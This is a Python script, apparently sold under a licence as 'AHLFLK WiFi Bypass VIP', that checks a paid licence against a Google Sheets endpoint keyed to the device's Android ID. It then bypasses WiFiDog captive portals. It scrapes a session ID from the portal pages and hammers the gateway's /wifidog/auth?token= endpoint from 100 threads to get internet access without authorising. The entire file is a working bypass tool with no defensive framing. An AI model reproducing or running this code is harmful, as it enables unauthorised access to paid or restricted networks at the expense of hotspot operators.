#!/usr/bin/env python

import requests
import re
import urllib3
import time
import threading
import os
import random
import json
import subprocess
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# CONFIG & COLORS
# ===============================
ORANGE = "\033[38;5;208m"
BOLD = "\033[1m"
RED = "\033[0;31m"
GREEN = "\033[0;32m"
CYAN = "\033[0;36m"
YELLOW = "\033[0;33m"
RESET = "\033[00m"

# Replace With Your Google Apps Script Web App URL
GSHEET_URL = "https://script.google.com/macros/s/AKfycbweARF-q3JqZ9YdiEX3uJlYPFxGa40QRrZbqStR2cRycwzIWQguL-ZesWBqAOHLp4A/exec"
ID_STORE = ".device_id.txt"
LIC_FILE = ".ahlflk_data.lic"

stop_event = threading.Event()
start_time = None

# ===============================
# UTILS & HEADER
# ===============================
def print_header(text):
    line = "═" * (len(text) + 4)
    print(f"\n{ORANGE}╔{line}╗")
    print(f"║  {BOLD}{text}{RESET}{ORANGE}  ║")
    print(f"╚{line}╝{RESET}")

def get_fixed_id():
    if os.path.exists(ID_STORE):
        with open(ID_STORE, "r") as f:
            return f.read().strip()
    
    dev_id = ""
    try:
        dev_id = subprocess.check_output('settings get secure android_id', shell=True).decode().strip()
    except:
        dev_id = ''.join(random.choices('0123456789ABCDEF', k=10))

    full_id = f"AHLFLK_{dev_id.upper()[:10]}"
    with open(ID_STORE, "w") as f:
        f.write(full_id)
    return full_id

# ===============================
# VIP CHECK (GOOGLE SHEETS)
# ===============================
def check_vip():
    my_id = get_fixed_id()
    os.system('clear')
    
    print_header("AHLFLK VIP SYSTEM")

    if os.path.exists(LIC_FILE):
        try:
            with open(LIC_FILE, "r") as f:
                lic_data = json.load(f)
            if lic_data.get("id") == my_id:
                expiry = datetime.strptime(lic_data["expiry"], "%d/%m/%Y")
                if datetime.now() < expiry:
                    print(f"{GREEN}{BOLD}✅ License Verified (Offline Mode){RESET}")
                    print(f"{CYAN}{BOLD}👤 VIP User : {lic_data.get('key')}{RESET}")
                    print(f"{CYAN}{BOLD}📆 Expires  : {lic_data.get('expiry')}{RESET}")
                    print("-" * 40)
                    time.sleep(1.5)
                    return True
                else:
                    print(f"{RED}{BOLD}❌ License Expired Offline!{RESET}")
                    os.remove(LIC_FILE)
        except: pass

    print(f"{CYAN}{BOLD}YOUR ID : {RESET}{YELLOW}{BOLD}{my_id}{RESET}")
    print(f"{RED}{BOLD}[!] Offline Data Missing or Expired.{RESET}")
    print(f"[*] Connecting to Google Cloud Server...")

    try:
        response = requests.get(GSHEET_URL, timeout=15, allow_redirects=True)
        vip_data_list = response.json()
        
        user_found = next((item for item in vip_data_list if item.get("Key") == my_id), None)
        
        if user_found:
            expiry_str = user_found.get("Expiration")
            try:
                expiry_date = datetime.strptime(expiry_str, "%d/%m/%Y")
            except:
                parts = expiry_str.split('/')
                expiry_str = f"{parts[0].zfill(2)}/{parts[1].zfill(2)}/{parts[2]}"
                expiry_date = datetime.strptime(expiry_str, "%d/%m/%Y")

            if datetime.now() < expiry_date:
                new_lic = {
                    "id": my_id, 
                    "key": user_found.get("Name"), 
                    "expiry": expiry_str
                }
                with open(LIC_FILE, "w") as f:
                    json.dump(new_lic, f, indent=4)
                print(f"{GREEN}{BOLD}✅ Online Activation Successful!{RESET}")
                time.sleep(2)
                return True
            else:
                print(f"{RED}{BOLD}❌ ID Found but License Expired ({expiry_str}){RESET}")
                return False
        
        print(f"{RED}{BOLD}❌ ID Not Registered in Database.{RESET}")
        return False
    except:
        print(f"{RED}{BOLD}❌ Connection Error! Could not Reach Google Sheets.{RESET}")
        return False

# ===============================
# NETWORK FUNCTIONS
# ===============================
def check_real_internet():
    try:
        return requests.get("http://www.google.com/generate_204", timeout=3).status_code == 204
    except:
        return False

def high_speed_pulse(auth_link):
    headers = {"User-Agent": "Mozilla/5.0", "Connection": "keep-alive"}
    while not stop_event.is_set():
        try:
            requests.get(auth_link, timeout=5, verify=False, headers=headers)
            time.sleep(0.05)
        except:
            time.sleep(1)
            break

# ===============================
# MAIN PROCESS
# ===============================
def start_process():
    global start_time
    if not check_vip():
        input(f"\n{YELLOW}{BOLD}Press Enter to Exit...{RESET}")
        return

    print_header("AHLFLK WiFi Bypass VIP")
    
    spinner = ['|', '/', '-', '\\']
    spin_idx = 0

    while not stop_event.is_set():
        session = requests.Session()
        try:
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            
            if r.status_code == 204 and check_real_internet():
                if start_time is None:
                    start_time = time.time()
                
                elapsed = time.strftime("%H:%M:%S", time.gmtime(time.time() - start_time))
                print(f"{GREEN}{BOLD}✅ Internet Connected! {ORANGE}{BOLD}[ {spinner[spin_idx]} ] {CYAN}{BOLD}Session: {elapsed} {RESET}", end="\r")
                
                spin_idx = (spin_idx + 1) % len(spinner)
                time.sleep(0.1)
                continue

            start_time = None 
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            
            print(f"\n{CYAN}{BOLD}[*] Portal Detected: {portal_host}{RESET}")

            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None
            
            if not sid:
                print(f"{RED}{BOLD}[!] Waiting for Portal Login...{RESET}", end="\r")
                time.sleep(3)
                continue

            print(f"{GREEN}{BOLD}✅ SID Captured: {sid}{RESET}")

            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]
            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"

            print_header("Turbo Threads Active")
            for i in range(100):
                threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()

            time.sleep(2)

        except KeyboardInterrupt:
            stop_event.set()
            break
        except:
            time.sleep(5)

if __name__ == "__main__":
    try:
        start_process()
    except KeyboardInterrupt:
        stop_event.set()
    finally:
        print(f"\n\n{RED}{BOLD}🛑 ShutDown...{RESET}")
